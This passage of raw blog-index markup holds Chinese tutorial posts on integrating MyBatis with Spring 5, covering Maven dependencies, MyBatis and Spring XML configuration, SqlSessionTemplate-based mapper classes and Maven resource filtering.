maven静态资源过滤</h4><p>​    由于mybatis的约定大于配置，因此要在maven配置文件中如下配置使得xml透过编译,注意目录是否一致</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/java<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.xml<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-3-spring\"><a href=\"#4-3-spring\" class=\"headerlink\" title=\"4.3 spring\"></a>4.3 spring</h3><h4 id=\"4-3-1spring的配置文件\"><a href=\"#4-3-1spring的配置文件\" class=\"headerlink\" title=\"4.3.1spring的配置文件\"></a>4.3.1spring的配置文件</h4><h4 id=\"applicationContext\"><a href=\"#applicationContext\" class=\"headerlink\" title=\"applicationContext\"></a>applicationContext</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:context</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-3-2增加数据源与sqlsession\"><a href=\"#4-3-2增加数据源与sqlsession\" class=\"headerlink\" title=\"4.3.2增加数据源与sqlsession\"></a>4.3.2增加数据源与sqlsession</h4><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3>","categories":["java"]},{"title":"mybatis+spring搭建","url":"/p/65016/","content":"<h1 id=\"Mybatis-Spring5\"><a href=\"#Mybatis-Spring5\" class=\"headerlink\" title=\"Mybatis+Spring5\"></a>Mybatis+Spring5</h1><h2 id=\"1-新建maven项目\"><a href=\"#1-新建maven项目\" class=\"headerlink\" title=\"1.新建maven项目\"></a>1.新建maven项目</h2><p>​    以org.apache.maven.archetypes:maven-archetype-webapp为原型建立maven项目</p>\n<h2 id=\"2-导入依赖\"><a href=\"#2-导入依赖\" class=\"headerlink\" title=\"2.导入依赖\"></a>2.导入依赖</h2><p>​    导入相关依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--mysql依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>mysql<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mysql-connector-java<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.47<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--mybatis依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.5.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--spring相关依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-webmvc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.3.10<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--spring操作数据库的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-jdbc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.3.10<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--aop的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.aspectj<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>aspectjweaver<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.9.7<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--spring操作mybatis的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis-spring<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--单元测试依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.11<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--bean的构建工具依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.projectlombok<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>lombok<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.18.22<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-构建pojo类相关包\"><a href=\"#3-构建pojo类相关包\" class=\"headerlink\" title=\"3.构建pojo类相关包\"></a>3.构建pojo类相关包</h2><h2 id=\"4-配置mybatis与spring的配置文件\"><a href=\"#4-配置mybatis与spring的配置文件\" class=\"headerlink\" title=\"4.配置mybatis与spring的配置文件\"></a>4.配置mybatis与spring的配置文件</h2><h3 id=\"4-1-mybatis\"><a href=\"#4-1-mybatis\" class=\"headerlink\" title=\"4.1 mybatis\"></a>4.1 mybatis</h3><h4 id=\"4-1-1编写xml文件\"><a href=\"#4-1-1编写xml文件\" class=\"headerlink\" title=\"4.1.1编写xml文件\"></a>4.1.1编写xml文件</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">configuration</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">PUBLIC</span> <span class=\"meta-string\">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-string\">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">settings</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">setting</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;logImpl&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">settings</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">typeAliases</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;com.iushop.pojo&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">typeAliases</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-1-2-编写Mapper与Mapper-xml\"><a href=\"#4-1-2-编写Mapper与Mapper-xml\" class=\"headerlink\" title=\"4.1.2 编写Mapper与Mapper.xml\"></a>4.1.2 编写Mapper与Mapper.xml</h4><p>Mapper.xml如下,只需修改mybatis.xml中的xml配置文件中的两个config改为mapper并修改根节点为<mapper></mapper></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">mapper</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">PUBLIC</span> <span class=\"meta-string\">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-string\">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">namespace</span>=<span class=\"string\">&quot;com.iushop.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mapper</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"4-2-spring\"><a href=\"#4-2-spring\" class=\"headerlink\" title=\"4.2 spring\"></a>4.2 spring</h3><h4 id=\"4-2-1spring的配置文件\"><a href=\"#4-2-1spring的配置文件\" class=\"headerlink\" title=\"4.2.1spring的配置文件\"></a>4.2.1spring的配置文件</h4><h4 id=\"applicationContext\"><a href=\"#applicationContext\" class=\"headerlink\" title=\"applicationContext\"></a>applicationContext</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:context</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">       http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-2-2增加数据源与sqlsession\"><a href=\"#4-2-2增加数据源与sqlsession\" class=\"headerlink\" title=\"4.2.2增加数据源与sqlsession\"></a>4.2.2增加数据源与sqlsession</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--DataSource使用spring的配置源替换mybatis的配置 c3p0 dbcp druid--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;driverClassName&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;url&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mybatis?\t\t  useUnicode=true<span class=\"symbol\">&amp;amp;</span>characterEncoding=UTF- 8<span class=\"symbol\">&amp;amp;</span>useSSL=true<span class=\"symbol\">&amp;amp;</span>serverTimezone=GMT%2B8<span class=\"symbol\">&amp;amp;</span>failOverReadOnly=false&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;root&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;root&quot;</span>/&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!--    sqlSessionFactory配置--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sqlSessionFactory&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;dataSource&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--    绑定mybatis配置文件 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;configLocation&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;classpath:mybatis-config.xml&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;mapperLocations&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;classpath:com/iushop/mapper/*.xml&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- sqlsession配置   --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;sqlSession&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 只能使用构造器注入，因为只有构造方法，没有set方法        --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">constructor-arg</span> <span class=\"attr\">index</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--对应实现类的bean--&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userMapper&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.iushop.mapper.UserMapperImpl&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sqlsession&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;sqlSession&quot;</span>/&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以设立一个特定的spring xml配置mybatis,r然后导入该xml </p>\n<ol>\n<li>编写数据源</li>\n<li>sqlSessionFactory</li>\n<li>sqlSessionTemplate</li>\n<li>给接口添加实现类</li>\n<li>将自己写的实现类注入到spring的配置文件中</li>\n<li>测试使用即可</li>\n</ol>\n<h4 id=\"4-2-3展示实现类\"><a href=\"#4-2-3展示实现类\" class=\"headerlink\" title=\"4.2.3展示实现类\"></a>4.2.3展示实现类</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserMapperImpl</span> <span class=\"keyword\">implements</span> <span class=\"title\">UserMapper</span></span>&#123;</span><br><span class=\"line\"><span class=\"comment\">//在原来我们所有的操作都使用sqlSession执行，现在都使用sqlSessionTemplate</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> SqlSessionTemplate sqlsession;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setSqlsession</span><span class=\"params\">(SqlSessionTemplate sqlsession)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.sqlsession = sqlsession;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> List&lt;User&gt; <span class=\"title\">selectUser</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        UserMapper mapper = sqlsession.getMapper(UserMapper.class);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mapper.selectUser();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> User <span class=\"title\">selectUserById</span><span class=\"params\">(<span class=\"keyword\">int</span> id)</span> </span>&#123;</span><br><span class=\"line\">        UserMapper mapper = sqlsession.getMapper(UserMapper.class);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mapper.selectUserById(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"4-2-4第二种方法\"><a href=\"#4-2-4第二种方法\" class=\"headerlink\" title=\"4.2.4第二种方法\"></a>4.2.4第二种方法</h4><p>继承SqlSessionDaoSupport ,无需sqlsession的注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserMapperImpl2</span> <span class=\"keyword\">extends</span> <span class=\"title\">SqlSessionDaoSupport</span> <span class=\"keyword\">implements</span> <span class=\"title\">UserMapper</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> List&lt;User&gt; <span class=\"title\">selectUser</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getSqlSession().getMapper(UserMapper.class).selectUser();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> User <span class=\"title\">selectUserById</span><span class=\"params\">(<span class=\"keyword\">int</span> id)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getSqlSession().getMapper(UserMapper.class).selectUserById(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>bean中的propertiesxvyaoyongsqlSessionFactory</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;userMapper2&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.iushop.mapper.UserMapperImpl2&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sqlSessionFactory&quot;</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"4-3-maven静态资源过滤\"><a href=\"#4-3-maven静态资源过滤\" class=\"headerlink\" title=\"4.3 maven静态资源过滤\"></a>4.3 maven静态资源过滤</h3><p>​    由于mybatis的约定大于配置，因此要在maven配置文件中如下配置使得xml透过编译,注意目录是否一致</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/java<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">includes</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">include</span>&gt;</span>**/*.properties<span class=\"tag\">&lt;/<span class=\"name\">include</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span 